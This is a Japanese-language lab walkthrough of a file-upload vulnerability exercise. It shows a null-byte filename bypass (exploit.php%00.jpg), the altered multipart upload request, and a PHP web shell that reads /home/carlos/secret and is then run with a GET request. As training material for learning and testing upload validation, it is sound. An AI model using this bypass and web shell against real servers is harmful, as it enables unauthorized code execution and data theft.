## Lab: Web shell upload via obfuscated file extension
	# ファイルアップロード脆弱性 - Null Byte インジェクション

## 概要

このラボのポイントは、サーバーが `.php` をブラックリストでブロックしているのに、**Null バイト (`%00`)** を使って検証を騙すことです。

```
exploit.php%00.jpg
         ↑
    ここでC言語的に文字列が終わる
    サーバーの検証: ".jpg" と認識 → 通過
    OSのファイル保存: "exploit.php" として保存
```

---

## 手順

### Step 1: ログイン & 画像アップロード

1. `wiener:peter` でログイン
2. アカウントページで **適当な画像**（test.jpg など）をアバターとしてアップロード
3. Burp の `Proxy > HTTP history` を確認

---

### Step 2: 2つのリクエストを Repeater へ

| リクエスト | 用途 |
|-----------|------|
| `POST /my-account/avatar` | ファイルアップロード用 |
| `GET /files/avatars/<画像名>` | ファイル実行確認用 |

両方を右クリック → **Send to Repeater**

---

### Step 3: PHPウェブシェルのアップロード（Null Byte使用）

`POST /my-account/avatar` の Repeater タブで：

**変更前：**
```
Content-Disposition: form-data; name="avatar"; filename="test.jpg"
Content-Type: image/jpeg

（画像データ）
```

**変更後：**
```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

> ⚠️ `Content-Type` も変更し、ボディを PHP コードに置き換える

**Send** → レスポンスに `exploit.php` として保存されたと表示されれば成功

---

### Step 4: PHPファイルを実行してシークレットを取得

`GET /files/avatars/` の Repeater タブで：

```
GET /files/avatars/exploit.php HTTP/1.1
```

**Send** → レスポンスボディにシークレット文字列が返ってくる

---

### Step 5: シークレットを提出

ラボのバナーの **Submit solution** ボタンをクリックして入力

---

## なぜ Null バイトが効くのか？

```
PHPや古いシステムではC言語的に文字列を処理
"exploit.php\0.jpg"
            ↑
          ここで文字列終端と解釈
→ ファイル名は "exploit.php" になる

でも拡張子チェック（バリデーション）は ".jpg" を見るので通過！
```

この攻撃は**モダンなPHP（5.3.4以降）では基本的にパッチ済み**ですが、古いシステムや設定ミスで今でも有効なことがあります。
## 変更① ファイル名に Null バイトを追加

```
filename="exploit.php%00.jpg"
```

サーバーは「.phpはアップロード禁止」というルールを持っている。

だから普通に `exploit.php` を送ると弾かれる。

---

そこで末尾に `%00.jpg` をくっつける。

```
exploit.php%00.jpg
```

`%00` は **Null バイト**といって、C言語では「文字列の終わり」を意味する特殊文字。

---

```
検証するとき:  exploit.php%00.jpg → 末尾が .jpg → OK！通す
保存するとき:  exploit.php%00.jpg → %00 で終わり → exploit.php として保存
```

つまり**チェックをすり抜けて、PHPとして保存させる**ことができる。

---





検証と保存はどこでされるかというと

## 検証と保存はどこでされるか？

両方とも**サーバー側**で行われる。

でも**別々の処理**でやっている。

```
ブラウザ → サーバー
              ↓
         ① 検証処理
            「拡張子チェック」
            → .jpg だ → OK！
              ↓
         ② 保存処理
            「ファイルを書き込む」
            → exploit.php%00.jpg を保存
            → でも %00 で文字列が終わる
            → exploit.php として保存される
```

---

ポイントは、**検証と保存が別々のコードで動いている**こと。

検証は「文字列として末尾を見る」だけ。  
保存は「OSにファイルを書き込む」処理で、OSが `%00` を文字列の終わりと解釈する。

この**2つの処理の解釈のズレ**を突いているのがこの攻撃。

---


## 変更② Content-Type を変更
通常、画像をアップロードすると：
Content-Type: image/jpeg
これは「このファイルは画像ですよ」とサーバーに伝えるもの。

今回はこれを変更した：
Content-Type: application/x-php
「このファイルはPHPですよ」と伝える。

**でも正直なところ、**このラボでは Content-Type の変更はあまり重要ではない。
サーバーが本当に検証しているのはファイル名の拡張子だけだったから。
厳しいサーバー → Content-Type も チェックする
このラボのサーバー → ファイル名の拡張子だけチェック
なので Null バイトで拡張子チェックをすり抜けた時点でほぼ勝ち。








### なぜcontent-Typetは変えなければいけないのか？


Content-Type の変更が意味を持つケースは：
サーバーが「Content-Type が image/jpeg 以外は拒否」
というチェックをしている場合
このラボはそこまで厳しくなかった、ということ。

ただし、このラボのサーバーはファイル名の拡張子しか見ていないから、Content-Type は image/jpeg のままでも exploit.php として保存されて実行できた可能性が高い。






### 何処で拒否したのかがわかるのか？


サーバーのレスポンスを見ればわかる。
例えば .php をそのままアップロードしようとすると：
Sorry, only JPG & PNG files are allowed
というエラーが返ってくる。
これは「拡張子を見てブロックした」というメッセージ。

もし Content-Type で弾いていたら、別のエラーメッセージが返ってくるはず。
Sorry, only image files are allowed
みたいな感じ。

つまりエラーメッセージの内容と、何を変えたら通ったかを見れば、どこでチェックしているかが推測できる。
Burp で色々変えながら試してみると「どのチェックが効いているか」がわかる。これがペネトレーションテストの基本的なアプローチ。

## 変更③ PHPコードの中身

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3つに分解して見てみる。

---

### `file_get_contents('/home/carlos/secret')`

```
サーバーのファイルシステムの中の
/home/carlos/secret というファイルを読み込む
```

---

### `echo`

```
読み込んだ内容を画面に出力する
```

---

### `<?php ... ?>`

```
「ここはPHPコードですよ」という囲み
```

---

つまり全部合わせると：

```
/home/carlos/secret を読んで、その中身を表示する
```

というだけのシンプルなコード。

---

このファイルがサーバーに保存されて、次の Step で**ブラウザからアクセスして実行**させる。


## Step 3: PHPファイルを実行してシークレット取得

Step 1 で確認した GET /files/avatars/ のリクエストを Repeater で書き換えた。
変更前：
```GET /files/avatars/test.jpg```
変更後：
```GET /files/avatars/exploit.php```

サーバーはこのリクエストを受け取って：
① /files/avatars/exploit.php を見つける
② .php だから PHP として実行する
③ file_get_contents('/home/carlos/secret') が動く
④ シークレットの中身がレスポンスに返ってくる

結果：
tgpPPmFvaOVv00lj9DriyeLyDNqpH6E4
これがシークレットの中身だった。
